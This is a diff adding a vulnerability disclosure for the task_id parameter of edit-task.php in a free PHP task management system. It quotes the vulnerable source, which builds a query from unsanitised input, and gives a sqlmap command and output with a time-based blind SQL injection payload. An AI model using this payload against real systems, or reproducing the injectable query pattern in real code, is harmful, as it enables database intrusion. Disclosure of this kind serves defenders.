@@ -1,0 +1,40 @@
+php task management system - SQL Injection on (edit-task.php?task_id=XX) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/php/17217/employee-management-system-php-and-mysql-free-download.html
+
+Version:V1.0
+
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+edit-task.php
+On this page task_id parameter is vulnerable to SQL Injection Attack
+  
+Source Code(taskmatic/edit-task.php):
+$task_id = $_GET['task_id'];
+if(isset($_POST['update_task_info'])){
+    $obj_admin->update_task_info($_POST,$task_id, $user_role);
+}
+$page_name="Edit Task";
+include("include/sidebar.php");
+$sql = "SELECT * FROM task_info WHERE task_id='$task_id' ";
+$info = $obj_admin->manage_all_info($sql);
+$row = $info->fetch(PDO::FETCH_ASSOC);
+
+Proof of vulnerability(Verify using the sqlmap tool):
+-> sqlmap -u http://localhost/taskmatic/edit-task.php\?task_id\=42 --cookie="Cookie:PHPSESSID=cckdidvs9fj069pko7q9au070s" --batch --current-user
+Output:
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: task_id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: task_id=42' AND (SELECT 4481 FROM (SELECT(SLEEP(5)))IZvK) AND 'QLlb'='QLlb
+---
+[04:54:34] [INFO] fetching current user
+[04:54:34] [INFO] resumed: root@localhost
+current user: 'root@localhost'
+
+
+
